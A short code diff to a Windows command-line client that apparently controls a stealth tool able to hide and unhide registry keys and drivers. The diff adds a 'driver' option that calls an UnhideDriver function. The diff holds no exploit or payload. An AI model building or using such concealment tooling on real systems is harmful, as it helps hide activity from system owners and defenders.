@@ -319,6 +319,10 @@ int wmain(int argc, const wchar_t* argv[]) {
 				success = nidhoggInterface.RegistryUnhideKey(_wcsdup(argv[3]));
 			}
 		}
+		else if (_wcsicmp(argv[1], L"driver") == 0) {
+			if (argc == 4)
+				success = nidhoggInterface.UnhideDriver(_wcsdup(argv[3]));
+		}
 		else {
 			success = NIDHOGG_INVALID_OPTION;
 		}
